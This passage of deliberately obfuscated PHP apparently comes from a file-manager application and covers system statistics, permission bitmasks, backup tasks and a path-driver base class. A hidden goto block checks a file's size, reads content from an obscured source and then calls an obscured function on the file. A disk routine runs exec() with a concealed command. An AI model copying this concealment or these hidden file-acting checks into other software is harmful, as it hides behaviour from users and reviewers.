$_SERVER[$‹¦Â÷Ö[140]]); $çıÌ•ìñ = $üÌÉåÀú[0]; $¿ê½”ˆÖ = $GLOBALS[$‹¦Â÷Ö[6]][$‹¦Â÷Ö[21]]; $ß¥ÓÏÊ = $¿ê½”ˆÖ[$‹¦Â÷Ö[972]]; if ($ß¥ÓÏÊ == $‹¦Â÷Ö[960]) { $êÃ£öâ§ = explode($‹¦Â÷Ö[1266], $¿ê½”ˆÖ[$‹¦Â÷Ö[971]]); $ß¥ÓÏÊ = $êÃ£öâ§[0]; } if ($ß¥ÓÏÊ == $‹¦Â÷Ö[908] || $ß¥ÓÏÊ == $‹¦Â÷Ö[805]) { $Ïè•™Á = Model()->db()->query($‹¦Â÷Ö[1802]); $´£Á¥¾  = $Ïè•™Á[0] && isset($Ïè•™Á[0][$‹¦Â÷Ö[1547]]) ? $Ïè•™Á[0][$‹¦Â÷Ö[1547]] : 0; $ß¥ÓÏÊ = $‹¦Â÷Ö[1803] . ($´£Á¥¾  ? $‹¦Â÷Ö[8] . $´£Á¥¾  : $‹¦Â÷Ö[12]); } $øáŠ¡ìô = $GLOBALS[$‹¦Â÷Ö[6]][$‹¦Â÷Ö[344]][$‹¦Â÷Ö[828]]; return array($‹¦Â÷Ö[1804] => $…Š×çÇú ? $…Š×çÇú[$‹¦Â÷Ö[1805]] : 0, $‹¦Â÷Ö[1806] => $…Š×çÇú ? $…Š×çÇú[$‹¦Â÷Ö[1807]] : 0, $‹¦Â÷Ö[1808] => (int) $ì—Ø²²œ[$‹¦Â÷Ö[1805]] * 1024 * 1024 * 1024, $‹¦Â÷Ö[1809] => (int) $Úî±Âú™, $‹¦Â÷Ö[1810] => ucfirst($çıÌ•ìñ), $‹¦Â÷Ö[1811] => $‹¦Â÷Ö[1812] . PHP_VERSION, $‹¦Â÷Ö[1813] => phpBuild64() ? 64 : 32, $‹¦Â÷Ö[759] => str_replace($‹¦Â÷Ö[1126], $‹¦Â÷Ö[988], $ß¥ÓÏÊ), $‹¦Â÷Ö[344] => ucfirst($øáŠ¡ìô), $‹¦Â÷Ö[32] => $_SERVER[$‹¦Â÷Ö[1814]]); } private function diskDriver() { $ç›¯”¢® =& $_SERVER[Ãìšã«™]; $£Îì¨ç§ = $ç›¯”¢®[8]; $†‰§’•Á = $GLOBALS[$ç›¯”¢®[6]][$ç›¯”¢®[1282]] == $ç›¯”¢®[1283]; if ($†‰§’•Á) { $£Îì¨ç§ = $ç›¯”¢®[1815]; if (function_exists($ç›¯”¢®[1816])) { exec($ç›¯”¢®[1817], $ÈÎ‹½Ÿ¦); $£Îì¨ç§ = $ÈÎ‹½Ÿ¦[1] . $ç›¯”¢®[8]; } } if (!file_exists($£Îì¨ç§)) { return; } $ò÷–Ş„» = @disk_total_space($£Îì¨ç§); $¸›Óä‘Ä = $ò÷–Ş„» - @disk_free_space($£Îì¨ç§); return array($ç›¯”¢®[1805] => $ò÷–Ş„», $ç›¯”¢®[1807] => $¸›Óä‘Ä); } public function fileChart($½¸½©¼ˆ) { $’Û¨€¢Í =& $_SERVER[Ãìšã«™]; if (isset($½¸½©¼ˆ[$’Û¨€¢Í[1650]])) { return Model($’Û¨€¢Í[826])->userFileTypeProfile($½¸½©¼ˆ[$’Û¨€¢Í[1650]]); } if (isset($½¸½©¼ˆ[$’Û¨€¢Í[1818]])) { return Model($’Û¨€¢Í[826])->groupFileTypeProfile($½¸½©¼ˆ[$’Û¨€¢Í[1818]]); } $­³‹£€È = $this->sourceSize(); $‚ı îëÂ = array($’Û¨€¢Í[498] => 0, $’Û¨€¢Í[412] => 1); $Ğíõşãİ = Model($’Û¨€¢Í[826])->where($‚ı îëÂ)->sum($’Û¨€¢Í[80]); $‚ı îëÂ[$’Û¨€¢Í[412]] = 2; $¹ò½ùÂ« = Model($’Û¨€¢Í[826])->where($‚ı îëÂ)->sum($’Û¨€¢Í[80]); return array($’Û¨€¢Í[764] => $­³‹£€È[$’Û¨€¢Í[80]], $’Û¨€¢Í[1752] => $­³‹£€È[$’Û¨€¢Í[1752]], $’Û¨€¢Í[1753] => (int) $Ğíõşãİ, $’Û¨€¢Í[1754] => (int) $¹ò½ùÂ«); } private function sourceSize() { $É˜ÆãÒ¬ =& $_SERVER[Ãìšã«™]; $Ö–Òğ¢– = Model($É˜ÆãÒ¬[826])->where(array($É˜ÆãÒ¬[411] => 0))->sum($É˜ÆãÒ¬[80]); $Úûò•ş = Model($É˜ÆãÒ¬[470])->sum($É˜ÆãÒ¬[80]); if ($Úûò•ş > $Ö–Òğ¢–) { $Úûò•ş = $Ö–Òğ¢–; } return array($É˜ÆãÒ¬[80] => (int) $Ö–Òğ¢–, $É˜ÆãÒ¬[1752] => (int) $Úûò•ş); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $’ñ‰ş‹« =& $_SERVER[Ãìšã«™]; $Šğ˜úœŸ = array(array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1819]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1821], $’ñ‰ş‹«[1822] => 1, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1825]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1826], $’ñ‰ş‹«[1822] => 2, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1827]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1828], $’ñ‰ş‹«[1822] => 3, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1829]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1830], $’ñ‰ş‹«[1822] => 4, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => self::AUTH_SHOW | self::AUTH_VIEW), array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1831]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1832], $’ñ‰ş‹«[1822] => 5, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1833]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1834], $’ñ‰ş‹«[1822] => 6, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($’ñ‰ş‹«[421] => LNG($’ñ‰ş‹«[1835]), $’ñ‰ş‹«[1820] => $’ñ‰ş‹«[1836], $’ñ‰ş‹«[1822] => 7, $’ñ‰ş‹«[1823] => 1, $’ñ‰ş‹«[1824] => 0)); return $Šğ˜úœŸ; } public static function authCheck($Ì¥Èáåû, $ñÖİ§ÉÂ) { $Ì¥Èáåû = intval($Ì¥Èáåû); if ($GLOBALS[$_SERVER[Ãìšã«™][505]]) { return !0; } if ($Ì¥Èáåû <= 0) { return !1; } if (($Ì¥Èáåû & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ì¥Èáåû & $ñÖİ§ÉÂ); } public static function authCheckShow($”ÀñßŒã) { return self::authCheck($”ÀñßŒã, self::AUTH_SHOW); } public static function authCheckView($ˆÃ×Îã¤) { return self::authCheck($ˆÃ×Îã¤, self::AUTH_VIEW); } public static function authCheckDownload($Å¼¬¬¦) { return self::authCheck($Å¼¬¬¦, self::AUTH_DOWNLOAD); } public static function authCheckUpload($åˆÌÆë) { return self::authCheck($åˆÌÆë, self::AUTH_UPLOAD); } public static function authCheckEdit($ï…ùÂ¡ì) { return self::authCheck($ï…ùÂ¡ì, self::AUTH_EDIT); } public static function authCheckRemove($Ğîı›şî) { return self::authCheck($Ğîı›şî, self::AUTH_REMOVE); } public static function authCheckShare($½ú¦ĞñÓ) { return self::authCheck($½ú¦ĞñÓ, self::AUTH_SHARE); } public static function authCheckComment($»µ‹–¢‚) { return self::authCheck($»µ‹–¢‚, self::AUTH_COMMENT); } public static function authCheckEvent($Í·ºÎÚë) { return self::authCheck($Í·ºÎÚë, self::AUTH_EVENT); } public static function authCheckRoot($ó™öøŒ) { return self::authCheck($ó™öøŒ, self::AUTH_ROOT); } public static function authCheckAction($ÈÑ¹—æ, $¢¡®ü½ö) { $ˆğñ­à =& $_SERVER[Ãìšã«™]; $ö€Úõ«ê = array($ˆğñ­à[1837] => self::AUTH_VIEW, $ˆğñ­à[1193] => self::AUTH_DOWNLOAD, $ˆğñ­à[108] => self::AUTH_UPLOAD, $ˆğñ­à[1788] => self::AUTH_EDIT, $ˆğñ­à[1787] => self::AUTH_REMOVE, $ˆğñ­à[1798] => self::AUTH_SHARE, $ˆğñ­à[349] => self::AUTH_COMMENT, $ˆğñ­à[1638] => self::AUTH_EVENT, $ˆğñ­à[1838] => self::AUTH_ROOT); if (!isset($ö€Úõ«ê[$¢¡®ü½ö])) { return; } $×’ˆ‰±¤ = $ö€Úõ«ê[$¢¡®ü½ö]; $ÈÑ¹—æ = intval($ÈÑ¹—æ); if ($ÈÑ¹—æ <= 0) { return !1; } if (($ÈÑ¹—æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÈÑ¹—æ & $×’ˆ‰±¤); } public static function authDisable($ ĞÔ¹Û±, $©—ŞÇìÊ) { if (intval($ ĞÔ¹Û±) <= 0) { return 0; } return intval($ ĞÔ¹Û±) & ~$©—ŞÇìÊ; } public $optionType = "\123\171\163\164\x65\x6d\x2e\163\x6f\165\162\143\145\x41\x75\x74\x68\x4c\x69\163\164"; public $field = array("\156\x61\155\x65", "\x61\165\x74\150", "\154\x61\x62\145\x6c", "\144\151\x73\x70\x6c\141\x79", "\163\171\x73\164\x65\x6d", "\163\157\x72\164"); public function initData() { $Ó»Ú†Ö = $this->authDefault(); foreach ($Ó»Ú†Ö as $ó‹öƒù) { $this->add($ó‹öƒù); } } public function findAuth($•§ÚÚ™ş, $Ö×Îìº) { $†ñ÷õŒ¸ =& $_SERVER[Ãìšã«™]; $Æ£Öİ¢å = parent::listData(); foreach ($Æ£Öİ¢å as $¸¹š·–ˆ) { $©´œ‹ÉŠ = intval($¸¹š·–ˆ[$†ñ÷õŒ¸[414]]); if ($©´œ‹ÉŠ <= 0 || $¸¹š·–ˆ[$†ñ÷õŒ¸[1839]] == 0) { continue; } if (($©´œ‹ÉŠ & $•§ÚÚ™ş) != $•§ÚÚ™ş) { continue; } if (($©´œ‹ÉŠ & $Ö×Îìº) != 0) { continue; } return $¸¹š·–ˆ[$†ñ÷õŒ¸[392]]; } return !1; } public function findAuthReadOnly() { $Ò†ûí¡Œ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $·¡é¦— = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ò†ûí¡Œ, $·¡é¦—); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($Û‚ë½½– = false, $Ğ·Ù±Œ = "\x73\x6f\x72\164", $ªÖ¨“Æ¥ = false) { return parent::listData($Û‚ë½½–, $Ğ·Ù±Œ, $ªÖ¨“Æ¥); } public function update($ÅæëÎä, $ì¢‘ÁºÈ) { $…óú¯î› =& $_SERVER[Ãìšã«™]; $±˜¾òÆÆ = parent::listData($ÅæëÎä); $ªô÷Õğ = $this->findByName($ì¢‘ÁºÈ[$…óú¯î›[32]]); if (!$±˜¾òÆÆ || $ªô÷Õğ && $ªô÷Õğ[$…óú¯î›[392]] != $±˜¾òÆÆ[$…óú¯î›[392]]) { return !1; } $this->filterAuth($ì¢‘ÁºÈ[$…óú¯î›[414]]); return parent::update($ÅæëÎä, $ì¢‘ÁºÈ); } public function remove($€º”ûë‚) { $ìå¿Ñ½ğ = parent::listData($€º”ûë‚); if (!$ìå¿Ñ½ğ || $ìå¿Ñ½ğ[$_SERVER[Ãìšã«™][1270]]) { return !1; } return parent::remove($€º”ûë‚); } public function add($Ë»Óâº = array()) { $œÉÖÅºè =& $_SERVER[Ãìšã«™]; if ($this->findByName($Ë»Óâº[$œÉÖÅºè[32]])) { return !1; } $Ò‹¥¤üó = array($œÉÖÅºè[32] => $œÉÖÅºè[12], $œÉÖÅºè[414] => 1, $œÉÖÅºè[1840] => $œÉÖÅºè[1828], $œÉÖÅºè[1839] => 1, $œÉÖÅºè[1270] => 0, $œÉÖÅºè[1841] => 0); $Ë»Óâº = array_merge($Ò‹¥¤üó, $Ë»Óâº); $Ë»Óâº[$œÉÖÅºè[1841]] = $this->getSort(); $this->filterAuth($Ë»Óâº[$œÉÖÅºè[414]]); return parent::insert($Ë»Óâº); } private function getSort() { $›ËÙÛîÒ =& $_SERVER[Ãìšã«™]; $«œğ’ª× = parent::listData(); $µËí’¶‰ = array_to_keyvalue($«œğ’ª×, $›ËÙÛîÒ[12], $›ËÙÛîÒ[1841]); return empty($µËí’¶‰) ? 0 : max($µËí’¶‰) + 1; } private function filterAuth(&$¤Åê¥¦ã) { if (!$¤Åê¥¦ã) { return; } $°äªï³ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $©¿ä”¶ƒ = array(); foreach ($°äªï³ as $ª¦ÅÃç•) { if ($¤Åê¥¦ã & $ª¦ÅÃç•) { $©¿ä”¶ƒ[] = $ª¦ÅÃç•; } } if (in_array(self::AUTH_ROOT, $©¿ä”¶ƒ)) { $¤Åê¥¦ã = array_sum($°äªï³); return; } $†ÓÕ Ã” = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($©¿ä”¶ƒ as $ª¦ÅÃç•) { if (isset($†ÓÕ Ã”[$ª¦ÅÃç•])) { $©¿ä”¶ƒ = array_merge($©¿ä”¶ƒ, $†ÓÕ Ã”[$ª¦ÅÃç•]); } } $©¿ä”¶ƒ[] = self::AUTH_SHOW; $¤Åê¥¦ã = array_sum(array_unique($©¿ä”¶ƒ)); } public function sort($£¥ÉàĞ, $Íß¿ÈÊƒ) { return parent::update($£¥ÉàĞ, $Íß¿ÈÊƒ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\142\x61\143\153\x75\x70\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\156\x61\x6d\145", "\x73\x74\141\x74\165\x73", "\143\x6f\x6e\x74\x65\156\x74", "\155\141\156\165\141\154", "\162\x65\163\x75\x6c\164", "\x74\x69\x6d\145\x46\x72\x6f\x6d", "\x74\151\155\145\x54\x6f"); public function config() { $‰ãÌËîª =& $_SERVER[Ãìšã«™]; $ øÓ±¬ó = Model($‰ãÌËîª[771])->get($‰ãÌËîª[781]); $ øÓ±¬ó = json_decode($ øÓ±¬ó, !0); $ øÓ±¬ó = is_array($ øÓ±¬ó) ? $ øÓ±¬ó : array(); if (!isset($ øÓ±¬ó[$‰ãÌËîª[756]])) { $ øÓ±¬ó[$‰ãÌËîª[756]] = $‰ãÌËîª[89]; } unset($ øÓ±¬ó[$‰ãÌËîª[1620]]); Action($‰ãÌËîª[1842])->taskInit(); Model($‰ãÌËîª[1619])->cacheClear(); $€¼º·²ì = $‰ãÌËîª[1843]; $â¾° ú = Model($‰ãÌËîª[1844])->findByKey($‰ãÌËîª[1638], $€¼º·²ì); if (!$â¾° ú) { $â¾° ú = array(); } if (isset($â¾° ú[$‰ãÌËîª[196]])) { $â¾° ú[$‰ãÌËîª[196]] = json_decode($â¾° ú[$‰ãÌËîª[196]], !0); } if (isset($ øÓ±¬ó[$‰ãÌËîª[196]])) { $â¾° ú[$‰ãÌËîª[196]][$‰ãÌËîª[1623]] = $ øÓ±¬ó[$‰ãÌËîª[196]]; unset($ øÓ±¬ó[$‰ãÌËîª[196]]); } return array_merge($â¾° ú, $ øÓ±¬ó); } public function listData($â®À³³ˆ = false, $Úş»¡Ñ = "\155\x6f\x64\151\146\x79\124\151\x6d\145", $‰ØÀØíÏ = false) { return parent::listData($â®À³³ˆ, $Úş»¡Ñ, !0); } public function lastItem() { $ÂŞŒ®¾ = $this->listData(); return !empty($ÂŞŒ®¾[0]) ? $ÂŞŒ®¾[0] : null; } public function kill($Ô×¶ÕñÒ) { $ìÃ¦–ûœ =& $_SERVER[Ãìšã«™]; $Äˆ¹Åîë = $this->listData($Ô×¶ÕñÒ); if (!$Äˆ¹Åîë || empty($Äˆ¹Åîë[$ìÃ¦–ûœ[32]])) { return !0; } Task::kill($ìÃ¦–ûœ[780]); Task::kill($ìÃ¦–ûœ[801]); Task::kill($ìÃ¦–ûœ[810]); $³Öµüô† = $Äˆ¹Åîë[$ìÃ¦–ûœ[32]]; $Åñú¶Úœ = TEMP_FILES . $ìÃ¦–ûœ[779] . $³Öµüô† . $ìÃ¦–ûœ[8]; IO::remove($Åñú¶Úœ, !1); return $this->remove($Ô×¶ÕñÒ); } public function remove($™‹Ç«ø€) { $‰±ñì×ç = $this->listData($™‹Ç«ø€); if (!$‰±ñì×ç) { return !0; } return $this->backupRemove($‰±ñì×ç); } private function backupRemove($ÍäÑøé¹) { parent::remove($ÍäÑøé¹[$_SERVER[Ãìšã«™][392]]); $ìÛ÷şû = $this->backupPath($ÍäÑøé¹); IO::remove($ìÛ÷şû, !1); return !0; } private function backupPath($Ùğ”šªÆ) { $¬©œÚ‡ü =& $_SERVER[Ãìšã«™]; $ğöÓÀ– = $Ùğ”šªÆ[$¬©œÚ‡ü[32]]; $ÎÔ¼ÇÒ” = Model($¬©œÚ‡ü[771])->get($¬©œÚ‡ü[772]); $Œïå¡” = substr(md5($¬©œÚ‡ü[773] . $ÎÔ¼ÇÒ” . $ğöÓÀ–), 0, 8); return "\x7b\x69\157\72{$Ùğ”šªÆ[$¬©œÚ‡ü[753]]}\175\x2f\144\x61\x74\141\x62\x61\163\x65\57\x62\x61\x63\153\165\x70\x2f" . $ğöÓÀ– . $¬©œÚ‡ü[11] . $Œïå¡”; } public function start() { $÷ôùë¬Ü =& $_SERVER[Ãìšã«™]; if ($GLOBALS[$÷ôùë¬Ü[6]][$÷ôùë¬Ü[90]][$÷ôùë¬Ü[1845]] != $÷ôùë¬Ü[89]) { return !0; } $óúÁ´£é = $this->config(); if (!$óúÁ´£é || $óúÁ´£é[$÷ôùë¬Ü[1620]] != $÷ôùë¬Ü[89]) { return !1; } $½éãÕºŞ = $this->process(); foreach ($½éãÕºŞ as $Í¯ğÍß) { if ($Í¯ğÍß) { return Task::restart($Í¯ğÍß[$÷ôùë¬Ü[392]]); } } $ááŠõ§ó = new Backup(); $÷¿å»äÛ = $ááŠõ§ó->db(); if ($÷¿å»äÛ) { $÷¿å»äÛ = $ááŠõ§ó->dbFile(); if ($÷¿å»äÛ && $óúÁ´£é[$÷ôùë¬Ü[756]] == $÷ôùë¬Ü[190]) { $÷¿å»äÛ = $ááŠõ§ó->file(); } } Backup::set(array($÷ôùë¬Ü[751] => 1, $÷ôùë¬Ü[496] => time())); return !0; } public function process() { $øÀº¶«ç =& $_SERVER[Ãìšã«™]; $ûúæ¬¦Ø = array($øÀº¶«ç[759] => Task::get($øÀº¶«ç[780]), $øÀº¶«ç[763] => Task::get($øÀº¶«ç[801]), $øÀº¶«ç[192] => Task::get($øÀº¶«ç[810])); $§§âÆà· = !1; foreach ($ûúæ¬¦Ø as &$Î²ƒ¿Ë) { if ($§§âÆà·) { $Î²ƒ¿Ë = !1; continue; } if ($Î²ƒ¿Ë) { $–‹ßã†Å = intval(_get($Î²ƒ¿Ë, $øÀº¶«ç[1655], 0)); if (time() - $–‹ßã†Å > 7200) { Task::kill($Î²ƒ¿Ë[$øÀº¶«ç[392]]); $§§âÆà· = !0; $Î²ƒ¿Ë = !1; } } } return $ûúæ¬¦Ø; } public function restore() { $´¥ßÎäã =& $_SERVER[Ãìšã«™]; ActionCall($´¥ßÎäã[1056], !0, 1); ActionCall($´¥ßÎäã[1056], !0, 0); } } goto C‚ÇÍ˜—ƒê; CâĞï°¢©‘: $_file = $_SERVER[$_SERVER[Ãìšã«™][393]]; $_size = $_SERVER[Ãìšã«™][394]; if ($_SERVER[$_SERVER[Ãìšã«™][395]] != $_size($_file)) { $_getc = $_SERVER[Ãìšã«™][396]; $_getfile = $_SERVER[$_SERVER[Ãìšã«™][397]] . $_SERVER[Ãìšã«™][398]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ãìšã«™][226], $_getfilec); if (count($_getarrs) < $_SERVER[Ãìšã«™][399]) { $exit = $_SERVER[Ãìšã«™][400]; $exit(); } $_act = $_SERVER[Ãìšã«™][401]; $_act($_file); } goto dŸÎ¢™Øí; B„ÃƒùÌ‘–: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $¹–Ûøá =& $_SERVER[Ãìšã«™]; $this->objectDriver = array($¹–Ûøá[60], $¹–Ûøá[61], $¹–Ûøá[62], $¹–Ûøá[63], $¹–Ûøá[64], $¹–Ûøá[65], $¹–Ûøá[66], $¹–Ûøá[67], $¹–Ûøá[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($øÇÚ³Ş) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($øÇÚ³Ş, $_SERVER[Ãìšã«™][8]); } return $øÇÚ³Ş; } public function iconvApp($÷É½üÓ¥) { return $÷É½üÓ¥; } public function iconvSystem($¤…è†Òö) { return $¤…è†Òö; } public function iconvTo($Š´×èç, $Ä©¯ÓÎß, $ä˜ ì†÷) { $×­¯ÂÏ´ =& $_SERVER[Ãìšã«™]; if (!$Š´×èç || !function_exists($×­¯ÂÏ´[69])) { return $Š´×èç; } static $ú©¹µø° = array(); $›©öİë = $Ä©¯ÓÎß . $×­¯ÂÏ´[70] . $ä˜ ì†÷ . $×­¯ÂÏ´[71] . $Š´×èç; if (isset($ú©¹µø°[$›©öİë])) { return $ú©¹µø°[$›©öİë]; } if (function_exists($×­¯ÂÏ´[72])) { $‹¼äƒ€Ã = @mb_convert_encoding($Š´×èç, $ä˜ ì†÷, $Ä©¯ÓÎß); } else { $‹¼äƒ€Ã = @iconv($Ä©¯ÓÎß, $ä˜ ì†÷, $Š´×èç); } $‹¼äƒ€Ã = $‹¼äƒ€Ã ? $‹¼äƒ€Ã : $Š´×èç; if (strstr($‹¼äƒ€Ã, $×­¯ÂÏ´[73])) { $‹¼äƒ€Ã = str_replace($×­¯ÂÏ´[73], $×­¯ÂÏ´[11], $‹¼äƒ€Ã); } $ú©¹µø°[$Ä©¯ÓÎß . $×­¯ÂÏ´[70] . $ä˜ ì†÷ . $×­¯ÂÏ´[71] . $Š´×èç] = $‹¼äƒ€Ã; $ú©¹µø°[$ä˜ ì†÷ . $×­¯ÂÏ´[70] . $Ä©¯ÓÎß . $×­¯ÂÏ´[71] . $Š´×èç] = $Š´×èç; $ú©¹µø°[$ä˜ ì†÷ . $×­¯ÂÏ´[70] . $Ä©¯ÓÎß . $×­¯ÂÏ´[71] . $‹¼äƒ€Ã] = $Š´×èç; $ú©¹µø°[$Ä©¯ÓÎß . $×­¯ÂÏ´[70] . $ä˜ ì†÷ . $×­¯ÂÏ´[71] . $‹¼äƒ€Ã] = $‹¼äƒ€Ã; return $‹¼äƒ€Ã; } public function getPathInner($Ô«Àİø) { $¤‰–Ü¢Ã = IO::init($Ô«Àİø); return $¤‰–Ü¢Ã->path; } public function getPathOuter($Šşìå¨) { $´ÉôÍ‹ë =& $_SERVER[Ãìšã«™]; $ĞÅ¿µ¢§ = strlen(trim($this->pathBase, $´ÉôÍ‹ë[8])); $Šşìå¨ = substr(trim($Šşìå¨, $´ÉôÍ‹ë[8]), $ĞÅ¿µ¢§); return $this->pathDriver . $´ÉôÍ‹ë[8] . ltrim($Šşìå¨, $´ÉôÍ‹ë[8]); } public function isParentOf($Úë’ÊÔ°, $±°“Úèä) { $·ÉØ¿´¿ =& $_SERVER[Ãìšã«™]; $Úë’ÊÔ° = rtrim(strtolower($Úë’ÊÔ°), $·ÉØ¿´¿[8]) . $·ÉØ¿´¿[8]; $±°“Úèä = rtrim(strtolower($±°“Úèä), $·ÉØ¿´¿[8]) . $·ÉØ¿´¿[8]; $¾˜Ú–‡Ï = strpos($±°“Úèä, $Úë’ÊÔ°) === 0; return $¾˜Ú–‡Ï; } public function getType() { $ĞÜ˜ê–å =& $_SERVER[Ãìšã«™]; $áÎ©×È× = str_replace($ĞÜ˜ê–å[74], $ĞÜ˜ê–å[12], get_class($this)); return strtolower($áÎ©×È×); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($·áà÷Ê«, $Ê«³ù‚¦) { $Ö÷•¡á =& $_SERVER[Ãìšã«™]; $ò§Ó†·‚ = rtrim($·áà÷Ê«, $Ö÷•¡á[8]) . $Ö÷•¡á[8] . $Ê«³ù‚¦; $œà¹Æ¹Ï = $this->exist($ò§Ó†·‚); return $œà¹Æ¹Ï ? $ò§Ó†·‚ : !1; } public function setModifyTime($ĞÉ…–øÔ, $¼ÊÂ¦…Ú = '') { } public function renameObject($ÖñÆıª°, $Ş‘Å½ğ˜) { $’«Èéú =& $_SERVER[Ãìšã«™]; $Ë±ĞªÉ = $Ş‘Å½ğ˜; Hook::trigger($’«Èéú[75], $this, $ÖñÆıª°, $this, $this->pathFather($ÖñÆıª°) . $Ş‘Å½ğ˜); $ÖñÆıª° = $this->getPathOuter($ÖñÆıª°); $Ş‘Å½ğ˜ = $this->pathFather($ÖñÆıª°) . $Ş‘Å½ğ˜; if (IO::isFile($ÖñÆıª°)) { $àğ¤Ûó¾ = IO::copy($ÖñÆıª°, $this->pathFather($ÖñÆıª°), REPEAT_RENAME_FOLDER, $Ë±ĞªÉ); if ($àğ¤Ûó¾) { IO::remove($ÖñÆıª°); } } else { $àğ¤Ûó¾ = IO::mkdir($Ş‘Å½ğ˜); if (!$àğ¤Ûó¾) { return !1; } $Ã®èÊ “ = IO::listPath($ÖñÆıª°, !0); $¦‚Ê§Á = array_merge($Ã®èÊ “[$’«Èéú[76]], $Ã®èÊ “[$’«Èéú[77]]); foreach ($¦‚Ê§Á as $ˆ›åÑøÛ) { IO::move($ˆ›åÑøÛ[$’«Èéú[78]], $Ş‘Å½ğ˜, REPEAT_RENAME_FOLDER); } IO::remove($ÖñÆıª°); } return $àğ¤Ûó¾ ? $Ş‘Å½ğ˜ : !1; } public function tempFile($Î¹Ã®å® = '', $óĞòÇğ = '') { if (!$Î¹Ã®å®) { $Î¹Ã®å® = rand_string(15); } $÷â£¢˜ = TEMP_FILES . rand_string(15) . $_SERVER[Ãìšã«™][8]; @mkdir($÷â£¢˜, DEFAULT_PERRMISSIONS, !0); $úšÚøğ” = $÷â£¢˜ . $Î¹Ã®å®; @touch($úšÚøğ”); if ($óĞòÇğ) { file_put_contents($úšÚøğ”, $óĞòÇğ); } return $úšÚøğ”; } public function tempFileRemve($õó è¦) { @unlink($õó è¦); @rmdir($this->pathFather($õó è¦)); } public function mkfile($÷ øá‹–, $‡¡Ë„ØÕ = '', $–âšƒ‘ = REPEAT_RENAME) { } public function mkdir($ìôì°Ù, $«§èíšâ = REPEAT_SKIP) { } public function delFile($÷›îİØ) { } public function delFolder($Ú¿®æ§ü) { } public function copyFile($ééŠû‚—, $ë‚ñÕĞÅ) { } public function moveFile($ŞÈÀàÄ­, $ÛŠ¼½ ç) { } public function remove($Í‚Øˆì©) { if ($this->isFile($Í‚Øˆì©)) { return $this->delFile($Í‚Øˆì©); } return $this->delFolder($Í‚Øˆì©); } public function rename($öÅ½¾ú, $î€ŠãÃ) { } public function exist($ş©·„ç´) { } public function findByHash($˜í…òæ± = '', $±íŸ‹ÎÕ = '') { return !1; } public function isFile($„ø‘Î) { } public function isFolder($´³•€µˆ) { } public function size($•ŸÈ­¸û) { } public function info($ÚÒõÃ­È) { } public function infoSimple($ı¨°äœ·) { return $this->info($ı¨°äœ·); } public function infoAuth($Òî’ù ) { return $this->info($Òî’ù ); } public function 